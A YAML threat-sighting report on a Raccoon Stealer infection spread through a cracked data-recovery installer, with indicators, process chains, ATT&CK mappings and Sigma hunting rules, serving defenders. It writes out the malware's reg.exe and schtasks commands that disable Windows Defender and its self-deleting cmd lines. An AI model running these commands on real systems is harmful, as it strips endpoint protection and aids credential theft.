@@ -1,0 +1,570 @@
+---
+header:
+  sightingReportId: 7f4ac984-c21b-4f88-a985-986fe416875a
+  status: wip
+  description: This Threat Sighting documents a case of _Raccoon Stealer_ bundled together with a cracked version of a commercial software tool. In this case, the user accessed a Youtube video that shows how to install and crack a tool called Stellar Data Recovery; download link is included in the description of the video. Likely Search Engine Optimization (SEO) poisoning was used for accelerating distribution. Upon infection, Raccoon accessed Web Browsers credentials stores and exfiltrated data to cloud storage.
+  author: Alejandro Houspanossian (@lekz86)
+  acknowledgement: Alejandro Houspanossian (@lekz86)
+  tlp: white
+  threatInformation:
+    adversaries:
+    - n/d
+    malware:
+    - adhoc-malware
+    - malzip
+    tools:
+    - 7zip
+    - timeout
+    - ping
+    - sqlite3
+    - doscmd/batch
+    lolbas:
+    - reg
+    - wscript
+    - cmd
+    - schtasks
+threatSightings:
+  - sighting: Initial Access - Threat actor used Search Engine Optimization (SEO) poisoning to lure users for Initial Access.
+    id: feca25fb-d7d5-4187-aee4-6706fc7fb6b4
+    behaviors:
+    - behavior: Chrome performs DNS Queries for suspicious domains (softwarebestever[.]fun, youtub[.]space).
+      type: DNS Queried
+      id: 99c514b7-b3f4-4eea-882a-2cb1226d01bd
+      weapon: chrome
+      connections:
+      - dstHost: softwarebestever[.]fun #hosted StellarDataRecoveryProfessional.rar
+        direction: outbound
+        protocol: tcp
+        process: "c:\\program files (x86)\\google\\chrome\\application\\chrome.exe"
+      - dstHost: youtub[.]space #download link provided in the youtube video
+        direction: outbound
+        protocol: tcp
+        process: "c:\\program files (x86)\\google\\chrome\\application\\chrome.exe"
+      notes:
+      - Search Engine Optimization (SEO) poisoning allows threat actors to rank their malicious resources higher in web searches.
+      - In this case, apparently, the user is searching for a cracked version of a tool called Stellar Data Recovery.
+      - softwarebestever[.]fun resolves to an IP address that corresponds to the Russian Federation
+      - There is osint that shows that softwarebestever[.]fun has served the file _StellarDataRecoveryProfessional.rar_ at some point in time (https://urlscan[.]io/search/#page.domain%3Asoftwarebestever.fun)
+      - Youtube video (https://www.youtube.com/watch?v=GJW-PN_O4z8) shows how to download and crack Stellar Data Recovery Professional.
+      - youtub[.]space is part of the url provided in the description of the video (https://www.youtube[.]com/redirect?event=video_description&redir_token=QUFFLUhqbEFBNzdjUXNuQklzWkdBSHFSYm1VN2Y0RkxDZ3xBQ3Jtc0tsN1NnVE5RODhvRlJ1cTlHamhBeG0tdFZhVFNFSG1SR2ZrS1ktWk9FMGlKQlZ5U0hJM2RKN05WWWN6TDFzWEliZ3cxU1JiYUZIVlVGb05NN0p0U2tGUC1ISVJvRlpVZlBzVU53aGxsZDRFbW9pQi1fdw&q=https%3A%2F%2Fyoutub[].]space%2FStellarDataRecoveryProfessional)
+      att&ck:
+        initialAccess:
+        - "T1189 - Drive-by Compromise"
+    - behavior: Chrome drops _.rar_ file.
+      type: File Created
+      id: 13c31c2b-3dc4-41fb-922c-f10cbb616886
+      weapon: malzip
+      files:
+        - name: StellarDataRecoveryProfessional.rar
+          path: 'C:\\Users\\#{user}\\Downloads\\StellarDataRecoveryProfessional.rar'
+          sha256: C7B007A0FA973B6F3AC5D4183D295EAAE4338C0DCB77C2E6E10507B50B8D6B88
+          process: "c:\\program files (x86)\\google\\chrome\\application\\chrome.exe"
+      notes:
+      - Unknown if user was maliciously redirected to perform this download
+      - StellarDataRecoveryProfessional.rar seems to be a cracked copy of Stellar Data Recovery Professional.
+      - StellarDataRecoveryProfessional.rar file has no reputation at VT (Oct 2nd 2021)
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Initial Access - Threat actor used compromised installers to lure users for Execution.
+    id: 76d2575e-d40d-4727-b5c2-f1c24aae52d1
+    behaviors:
+    - behavior: User opened malicious .rar file.
+      type: Process Created
+      id: 0249c936-d4da-4a05-956c-fc374f949fe6
+      weapon: malzip
+      processes:
+      - cmdLine:
+        - '"C:\\Program Files (x86)\\IZArc\\IZArc.exe\" -ef C:\\Users\\#{user}\\Downloads C:\\Users\\#{user}\\Downloads\\StellarDataRecoveryProfessional.rar'
+        process: "C:\\Program Files (x86)\\IZArc\\IZArc.exe"
+        parentProcess: "C:\\Windows\\explorer.exe"
+      notes:
+      - As parent process is Explorer, likely the user executed  the process.
+      - IZArc.exe seems to be legit archiving functionality
+      att&ck:
+        execution:
+        - "T1204.002 - User Execution: Malicious File"
+    - behavior: User executed compromissed installer.
+      type: Process Created
+      id: 9417614b-6150-4717-99ce-18811b7ff12d
+      weapon: adhoc-malware
+      processes:
+      - process: 'C:\\Users\\#{user}\\Downloads\\StellarDataRecoveryProfessional\\StellarDataRecoveryProfessional\\StellarDataRecovery-Professional.exe'
+        sha256: 56783C2E395603404C92BC44CA0C39D4BBCC312EDBF6D2349E367C232C5B8E57
+        cmdLine:
+        - 'C:\\Users\\#{user}\\Downloads\\StellarDataRecoveryProfessional\\StellarDataRecoveryProfessional\\StellarDataRecovery-Professional.exe'
+        parentProcess: "c:\\windows\\system32\\svchost.exe"
+      notes:
+      - StellarDataRecovery-Professional.exe seems to be a fake or compromissed installer.
+      - https://www.virustotal.com/gui/file/56783c2e395603404c92bc44ca0c39d4bbcc312edbf6d2349e367c232c5b8e57
+      - 13/69 detections at VT (Oct 2nd 2021)
+      att&ck:
+        execution:
+        - "T1204.002 - User Execution: Malicious File"
+    - behavior: Multiple files created at %ProgramData% (including 7zip binary, batch files and Visual Basic scripts)
+      type: File Created
+      id: e0f2f533-6128-465f-9eed-feacf8c5087b
+      weapon: adhoc-malware
+      files:
+        - path: 'C:\\ProgramData\\IgHMwb34dcD\\7z.exe'
+          name: 7z.exe
+          sha256: 344F076BB1211CB02ECA9E5ED2C0CE59BCF74CCBC749EC611538FA14ECB9AAD2
+          process: "c:\\users\\#{user}\\appdata\\local\\temp\\is-93dgj.tmp\\stellardatarecovery-professional.tmp"
+        - path: 'C:\\ProgramData\\IgHMwb34dcD\\main.bat'
+          name: main.bat
+          sha256: A3D45F57D6B62B2D09C4DCCA451BF06A0EF330664B796813841D7EA0934FCF06
+          process: "c:\\users\\#{user}\\appdata\\local\\temp\\is-93dgj.tmp\\stellardatarecovery-professional.tmp"
+        - path: 'C:\\ProgramData\\IgHMwb34dcD\\STRTbbbn7przuvwav4hbpbps.vbs'
+          name: STRTbbbn7przuvwav4hbpbps.vbs
+          sha256: 684985D417BC480CC3DA17A8BD2A081CCB67A2C3315CE18ABCB7C7B8EA5F8D58
+          process: "c:\\users\\#{user}\\appdata\\local\\temp\\is-93dgj.tmp\\stellardatarecovery-professional.tmp"
+        - path: 'C:\\ProgramData\\IgHMwb34dcD\\DELbbbn7l3bnchd166d2hhhv.bat'
+          name: DELbbbn7l3bnchd166d2hhhv.bat
+          sha256: A03DC8EE2667DBCA232204A70221F5D9BB75A92164459CAE77E59AD8A2D20425
+          process: "c:\\users\\#{user}\\appdata\\local\\temp\\is-93dgj.tmp\\stellardatarecovery-professional.tmp"
+        - path: 'C:\\ProgramData\\IgHMwb34dcD\\AVDbbbn7i3b4ho55ck6raahj.bat'
+          name: AVDbbbn7i3b4ho55ck6raahj.bat
+          sha256: 91CE5C5B2E5B19258D79F4DA4DC087058A67C657F586C6C17CB5BEF93070479E
+          process: "c:\\users\\#{user}\\appdata\\local\\temp\\is-93dgj.tmp\\stellardatarecovery-professional.tmp"
+      notes:
+      - main.bat is related to https://github.com/hXR16F/AntiAV/blob/master/AntiAV.bat, and Anti AntiVirus project.
+      - AntiAV obfuscates files using compression via 7zip
+  - sighting: Execution - Threat actor used _Visual Basic scripts_ to launch a _doscmd/batch_ file via _CMD_ for Execution.
+    id: 56dec4d9-453c-45a8-b8f2-b4ccb53160af
+    behaviors:
+    - behavior: Malware ran a Visual Basic script to launch execution of a batch file via CMD.
+      type: Process Created
+      id: fb027c4c-02c6-45ed-aee3-fd90fded4552
+      weapon: wscript
+      processes:
+      - process: C:\\Windows\\SysWOW64\\wscript.exe
+        embedFilename: "wscript.exe"
+        cmdLine:
+        - '"C:\\Windows\\System32\\WScript.exe\" \"C:\\ProgramData\\IgHMwb34dcD\\STRTbbbn7przuvwav4hbpbps.vbs\"'
+        parentProcess: "c:\\users\\#{user}\\appdata\\local\\temp\\is-93dgj.tmp\\stellardatarecovery-professional.tmp"
+      notes:
+      - Script available at VT https://www.virustotal.com/gui/file/91ce5c5b2e5b19258d79f4da4dc087058a67c657f586c6c17cb5bef93070479e/content
+      - detection rate 2/58 (Oct 2nd 2021)
+      att&ck:
+        defenseEvasion:
+        - "T1059.005 - Command and Scripting Interpreter: Visual Basic"
+    - behavior: Malware executed a batch file via CMD.
+      type: Process Created
+      id: 95cb0422-3a8a-46f1-83d0-a7283c65629a
+      weapon: cmd
+      processes:
+      - process: C:\\Windows\\SysWOW64\\cmd.exe
+        cmdLine:
+        - 'C:\\Windows\\system32\\cmd.exe /c \"\"C:\\ProgramData\\IgHMwb34dcD\\AVDbbbn7i3b4ho55ck6raahj.bat\" \"'
+        parentProcess: C:\\Windows\\SysWOW64\\wscript.exe
+      notes:
+      - Script available at VT https://www.virustotal.com/gui/file/684985d417bc480cc3da17a8bd2a081ccb67a2c3315ce18abcb7c7b8ea5f8d58
+      - detection rate 6/57 (Oct 2nd 2021)
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Execution - Threat actor used _doscmd/batch_ files to disable Windows Defender via multiple _reg.exe_ and _SCHTASKS.exe_ for Defense Evasion.
+    id: abcec4d9-1234-45a8-b8f2-b4ccb5316321
+    behaviors:
+    - behavior: Malware launched _REG.exe_ (attempted to modify Windows Defender _policy configurations_).
+      type: Process Created
+      id: b2905d3b-0eb0-43ca-b7e2-2b67df5f06c2
+      weapon: reg
+      processes:
+      - process: C:\\Windows\\SysWOW64\\reg.exe
+        cmdLine:
+        - 'reg  add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d \"0\" /f'
+        - 'reg  delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f'
+        - 'reg  add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"2\" /f'
+        - 'reg  add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f'
+        - 'reg  add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f'
+        parentProcess: C:\\Windows\\SysWOW64\\cmd.exe
+      att&ck:
+        defenseEvasion:
+        - "T1562.001 - Impair Defenses: Disable or Modify Tools"
+        - "T1112 - Modify Registry"
+    - behavior: Malware launched _SCHTASKS_ (attempted to modify Windows Defender _scheduled tasks_)
+      type: Process Created
+      id: f94cdae1-4016-4127-af0f-240edf2a2cbb
+      weapon: schtasks
+      processes:
+      - cmdLine:
+        - 'schtasks  /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable'
+        - 'schtasks  /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable'
+        - 'schtasks  /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable'
+        - 'schtasks  /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable'
+        process: C:\\Windows\\SysWOW64\\schtasks.exe
+        parentProcess: C:\\Windows\\SysWOW64\\cmd.exe
+      att&ck:
+        defenseEvasion:
+        - "T1562.001 - Impair Defenses: Disable or Modify Tools"
+    - behavior: Malware launched _REG.exe_ (attempted to modify Windows Defender _services configuration_).
+      type: Process Created
+      id: a0b5d317-a3c7-40c5-af19-66b75cd31294
+      weapon: reg
+      processes:
+      - cmdLine:
+        - 'reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v \"SecurityHealth\" /f'
+        - 'reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SecurityHealth\" /f'
+        - 'reg delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f'
+        - 'reg delete \"HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP\" /f'
+        - 'reg delete \"HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP\" /f'
+        - 'reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /t REG_DWORD /d \"4\" /f'
+        - 'reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /t REG_DWORD /d \"4\" /f'
+        - 'reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /t REG_DWORD /d \"4\" /f'
+        - 'reg add \"HKLM\\System\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /t REG_DWORD /d \"4\" /f'
+        - 'reg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t REG_DWORD /d \"4\" /f'
+        process: C:\\Windows\\SysWOW64\\reg.exe
+        parentProcess: C:\\Windows\\SysWOW64\\cmd.exe
+      notes:
+      - setting Start to 4 means disabling the service.
+      att&ck:
+        defenseEvasion:
+        - "T1562.001 - Impair Defenses: Disable or Modify Tools"
+        - "T1112 - Modify Registry"
+  - sighting: Defense Evasion - Threat actor used _AntiAV_ (an open source tool obfuscation tool) to obfuscate malware binary file for Defense Evasion.
+    id: 367a2644-289f-428d-992f-e4b9e23c25f7
+    behaviors:
+    - behavior: Malware executed open source deobfuscator tool (https://github.com/hXR16F/AntiAV/) via CMD.exe.
+      type: Process Created
+      id: 27a8102c-484d-49c9-b9ea-51bb764a83a1
+      weapon: antiav
+      processes:
+      - cmdLine:
+        - 'C:\\Windows\\system32\\cmd.exe /c \"\"C:\\ProgramData\\IgHMwb34dcD\\main.bat\"'
+        process: C:\\Windows\\SysWOW64\\cmd.exe
+        parentProcess: 'C:\\Windows\\System32\\WScript.exe'
+      notes:
+      - Script available at VT https://www.virustotal.com/gui/file/a3d45f57d6b62b2d09c4dcca451bf06a0ef330664b796813841d7ea0934fcf06/content
+      - detection rate 0/58 (Oct 2nd 2021)
+      - main.bat is an obfuscator https://github.com/hXR16F/AntiAV/.
+      att&ck:
+        defenseEvasion:
+        - "T1140 - Deobfuscate/Decode Files or Information"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: Malware created Raccoon InfoStealer binary file at %ProgramData% folder.
+      type: File Created
+      id: 39cde68c-fcba-4065-abd3-199a65aedd3b
+      weapon: antiav
+      files:
+        - name: door.exe
+          path: 'C:\\ProgramData\\IgHMwb34dcD\\door.exe'
+          sha256: A1FF11C6E6E4AA54B60A2D44B6D2F05A48E6C617F0D89801A90EC56C29223B21
+          process: "C:\\Windows\\SysWOW64\\cmd.exe"
+      notes:
+      - door.exe is available at VT https://www.virustotal.com/gui/file/a1ff11c6e6e4aa54b60a2d44b6d2f05a48e6c617f0d89801a90ec56c29223b21
+      - first submited around the time of this sighting.
+      - current detection is 45/69 (oct 2nd 2021)
+      att&ck:
+        defenseEvasion:
+        - "T1140 - Deobfuscate/Decode Files or Information"
+  - sighting: Defense Evasion - Threat actor used _CMD_ to launch Raccoon InfoStealer for Execution.
+    id: 123a2644-289f-428d-992f-e4b9e23c2456
+    behaviors:
+    - behavior: Raccoon InfoStealer was launched via _CMD_.
+      type: Process Created
+      id: 54a3969c-a418-4017-acbd-b8870bdac1a3
+      weapon: adhoc-malware
+      processes:
+      - process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+        embedFilename: "RegistryOptio.exe"
+        cmdLine:
+        - '"door.exe"'
+        parentProcess: "C:\\Windows\\SysWOW64\\cmd.exe"
+      notes:
+      - door.exe is the info stealer.
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Execution - Malware used HTTP to download additional tools for Command And Control.
+    id: 72b4a1a6-d91a-44d8-957d-07ee703ce269
+    behaviors:
+    - behavior: Raccoon malware executed by itself
+      type: Process Created
+      id: f089bd08-a76a-4be0-9326-45c96b2c49ac
+      weapon: adhoc-malware
+      processes:
+      - process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+        embedFilename: "RegistryOptio.exe"
+        cmdLine:
+        - '"C:\\ProgramData\\IgHMwb34dcD\\door.exe"'
+        parentProcess: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+      notes:
+      - Process image file is not signed.
+    - behavior: Raccoon InfoStealer connected to C2 server (telete[.]in:443).
+      type: Network Accessed
+      id: d757b242-b556-40c5-b27d-73489219689a
+      weapon: adhoc-malware
+      connections:
+        - dstIp: 195.201.225[.]248
+          dstHost: telete[.]in
+          dstPort: 443
+          protocol: tcp
+          direction: outbound
+          process: C:\\ProgramData\\IgHMwb34dcD\\door.exe
+      notes:
+      - IP addresses correspond to the Russian Federation
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+    - behavior: Raccoon InfoStealer connected to C2 server (port IP:80).
+      type: Network Accessed
+      id: 6e118c1a-5772-4c53-9236-15d18f1bfd45
+      weapon: adhoc-malware
+      connections:
+        - dstIp: 185.53.46[.]105
+          dstPort: 80
+          protocol: tcp
+          direction: outbound
+          process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+      notes:
+      - IP addresses correspond to Czech Republic and Republic of Moldova
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+    - behavior: Raccoon InfoStealer downloaded a copy of sqlite3.dll from C2 server
+      type: File Created
+      id: e2db56c9-5b03-45be-b5fb-ca5b0b5e9d66
+      weapon: adhoc-malware
+      files:
+        - name: sqlite3.dll
+          path: 'C\\Users\\#{user}\\AppData\\LocalLow\\sqlite3.dll'
+          sha256: 7DA4E1ED5F6A033A7E9D45294E155AA2F4B5F08888D15CED8F05404C0781C4AE
+          process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+      notes:
+      - SQLite is a software library that implements a self-contained, serverless, zero-configuration, transactional SQL database engine.
+      - Threat Actors leverage SQLite to access the credential databases
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Execution - Malware used _Native APIs_ to access Chrome credentials store for Credential Access.
+    id: 165ada43-bb67-4452-8f08-0ff7c7a54cab
+    behaviors:
+    - behavior: Raccoon InfoStealer reads Chrome credentials store
+      type: File Read
+      id: f52bb6c4-beda-42a7-abf8-e54b2e47624f
+      weapon: adhoc-malware
+      files:
+        - path: 'C:\\Users\\#{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
+          name: '\\*'
+          process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+      notes:
+      - '"\\User Data\\Default\\Login Data" is a SQlite3 database that stores the credentials of the Default profile'
+      - Values are encrypted using Microsoft’s Data Protection API (DPAPI)
+      - DPAPI consists of 2 functions -> CryptProtectData() and CryptUnprotectData() which symetrically encrypt/decrypt data.
+      att&ck:
+        credentialAccess:
+        - "T1555.003 - Credentials from Password Stores: Credentials from Web Browsers"
+    - behavior: Raccoon InfoStealer calls CryptUnprotectData API.
+      type: Api Invoked
+      id: 7d4ddec3-9416-481d-976d-b8f4ecb92eee
+      weapon: adhoc-malware
+      apis:
+      - apiName: CryptUnprotectData
+        process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+      notes:
+      - CryptUnprotectData function decrypts data using implicit crypto keys tied to a specific user or system.
+      att&ck:
+        credentialAccess:
+        - "T1555.003 - Credentials from Password Stores: Credentials from Web Browsers"
+        execution:
+        - "T1106 - Native API"
+  - sighting: Credential Access - Malware used _SQlite3_ DLL to read Firefox credentials store for Credential Access.
+    id: e550d43c-f294-46b0-87c6-29d2aa0fa75b
+    behaviors:
+    - behavior: Raccoon InfoStealer accessed Firefox credential store.
+      type: File Modified
+      id: 76781092-0699-46fc-bbc5-a78292f250f4
+      weapon: adhoc-malware
+      files:
+        - path: "C:\\Users\\#{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{random}.default-release\\cert9.db"
+          name: cert9.db
+          process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+        - path: "C:\\Users\\#{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{random}.default-release\\key4.db"
+          name: key4.db
+          process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+      notes:
+      - cert9.db is a SQLite database that stores security certificate settings and SSL certificates imported into Firefox.
+      - key4.db is a SQLite database that stores passwords.
+      - logins.json stores (encrypted) passwords
+      - as a previous step, SQlite3 dll was downloaded.
+      att&ck:
+        credentialAccess:
+        - "T1555.003 - Credentials from Password Stores: Credentials from Web Browsers"
+  - sighting: Credential Access - Malware used _unconfirmed method_ to create a _.zip_ file for Collection.
+    id: 8942085c-f5fd-4a1a-9f4c-fc3ed70e2e4d
+    behaviors:
+    - behavior: Raccoon InfoStealer created a zip file
+      type: File Created
+      id: f9a8554f-35d5-46b0-a3f2-f475f97834e1
+      weapon: adhoc-malware
+      files:
+        - name: bjZYHn4lcwr.zip
+          path: 'C:\\Users\\#{user}\\AppData\\LocalLow\\bjZYHn4lcwr.zip'
+          process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+      notes:
+      - it is not known to us, the method used to create the _zip_ file.
+      att&ck:
+        collection:
+        - "T1560 - Archive Collected Data"
+  - sighting: Collection - Malware used _cloud storage_ for Exfiltration.
+    id: 1234085c-f5fd-4a12-234c-fc3ed70e2321
+    behaviors:
+    - behavior: Raccoon performed DNS Queries to cdn.discordapp[.]com.
+      type: DNS Queried
+      id: ec028eca-ace6-4717-be99-3f6295bfcadc
+      weapon: adhoc-malware
+      connections:
+      - dstHost: cdn.discordapp[.]com
+        direction: outbound
+        protocol: tcp
+        process: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+      notes:
+      - Discord is a VoIP, instant messaging and digital distribution platform.
+      - DNS Query events are precursory indicators of network ativity.
+      att&ck:
+        commandAndControl:
+        - "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+  - sighting: Execution - Malware used _CMD delayed command execution_ to delelete itself for Defense Evasion.
+    id: 96f5bb27-ac7a-49cb-99d2-1449f1e7ff48
+    behaviors:
+    - behavior: Raccoon InfoStealer introduced a delayed command execution via CMD to delete itself.
+      type: Process Created
+      id: 4c582288-580a-4cd1-9de3-460891e12643
+      weapon: cmd
+      processes:
+      - process: "C:\\Windows\\System32\\cmd.exe"
+        cmdLine:
+        - 'cmd.exe /C timeout /T 10 /NOBREAK > Nul & Del /f /q "C:\\ProgramData\\IgHMwb34dcD\\door.exe"'
+        - 'ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "C:\\ProgramData\\IgHMwb34dcD\\door.exe"' #this IOC taken from other analysis
+        parentProcess: "C:\\ProgramData\\IgHMwb34dcD\\door.exe"
+      notes:
+      - Via Timeout command a delay of 10 seconds is introduced.
+      - Via ping command a delay of 3000 miliseconds is introduced.
+      - Del is native cmd function for deleting files.
+      att&ck:
+        defenseEvasion:
+        - "T1070.004 - Indicator Removal on Host: File Deletion"
+        execution:
+        - "T1059 - Command and Scripting Interpreter: Windows Command Shell"
+threatHunting:
+  - query: Hunt for delayed execution of DEL commands for Defense Evasion (T1070.004)
+    queryId: a9379db9-6757-463c-acb9-9e7b26b55b95
+    type: sigma
+    behaviorIds:
+    - 4c582288-580a-4cd1-9de3-460891e12643
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+        selection1:
+            Image|endswith: '\\cmd.exe'
+            commandLine|contains|all:
+              - 'cmd.exe /C timeout /T'
+              - 'NOBREAK'
+              - 'Del /f /q'
+        selection2:
+            Image|endswith: '\\cmd.exe'
+            commandLine|contains|all:
+              - 'ping'
+              - '-n'
+              - 'Del /f /q'
+        condition: selection1 OR selection2
+  - query: Hunt for attempts to Disable Windows Defender via CMD and REG.exe
+    queryId: e9e0a174-74a1-4327-8867-13c8e6bb362c
+    type: sigma
+    behaviorIds:
+    - b2905d3b-0eb0-43ca-b7e2-2b67df5f06c2
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+        selection:
+            ParentImage|endswith: '\\cmd.exe'
+            ParentCommandLine|contains: 'ProgramData'
+            Image|endswith: '\\reg.exe'
+            CommandLine|contains|all:
+              - 'Windows Defender'
+              - 'Features'
+              - 'TamperProtection'
+              - '0'
+        selection2:
+            ParentImage|endswith: '\\cmd.exe'
+            ParentCommandLine|contains: 'ProgramData'
+            Image|endswith: '\\reg.exe'
+            commandLine|contains:
+              - 'Real-Time Protection'
+              - 'Reporting'
+              - 'SpyNet'
+              - 'Autologger'
+            commandLine|contains:
+              - 'DisableScanOnRealtimeEnable'
+              - 'DisableRealtimeMonitoring'
+              - 'DisableOnAccessProtection'
+              - 'DisableIOAVProtection'
+              - 'DisableBehaviorMonitoring'
+              - 'DisableEnhancedNotifications'
+              - 'DisableBlockAtFirstSeen'
+              - 'SpynetReporting'
+              - 'SubmitSamplesConsent'
+              - 'DefenderApiLogger'
+              - 'DefenderAuditLogger'
+        condition: selection or selection2
+  - query: Hunt for Suspicious execution of bat files via CMD and Wscript.exe
+    queryId: fa77d19c-b525-4ba4-8fdc-b1f0a6dc68a7
+    type: sigma
+    behaviorIds:
+    - 95cb0422-3a8a-46f1-83d0-a7283c65629a
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+        selection:
+            ParentImage|endswith: '\\wscript.exe'
+            Image|endswith: '\\cmd.exe'
+            commandLine|contains|all:
+              - 'cmd.exe /c'
+              - 'ProgramData'
+              - 'bat'
+        condition: selection
+  - query: Hunt for execution of Anti AntiVirus tool via CMD and Wscript.exe
+    queryId: a1f368b9-c31a-46a1-8ce7-75036cfe32e8
+    type: sigma
+    behaviorIds:
+    - 27a8102c-484d-49c9-b9ea-51bb764a83a1
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+        selection:
+            ParentImage|endswith: '\\wscript.exe'
+            Image|endswith: '\\cmd.exe'
+            commandLine|contains|all:
+              - 'main.bat'
+              - 'programdata'
+        condition: selection
+footer:
+  changeTracking:
+    created: 2021-10-02
+    lastModified: 2022-03-22
+    sightingVersion: 1.8
+    schemaVersion: 1.7
+  references:
+  - https://malpedia.caad.fkie.fraunhofer.de/details/win.raccoon
+  - https://www.sentinelone.com/labs/info-stealers-how-malware-hacks-private-user-data/
+  - https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/
+  - https://renenyffenegger.ch/notes/development/web/browser/Firefox/profile-folder/index
+  - https://blogs.blackberry.com/en/2021/09/threat-thursday-raccoon-infostealer
+  - https://news.sophos.com/en-us/2021/08/03/trash-panda-as-a-service-raccoon-stealer-steals-cookies-cryptocoins-and-more/
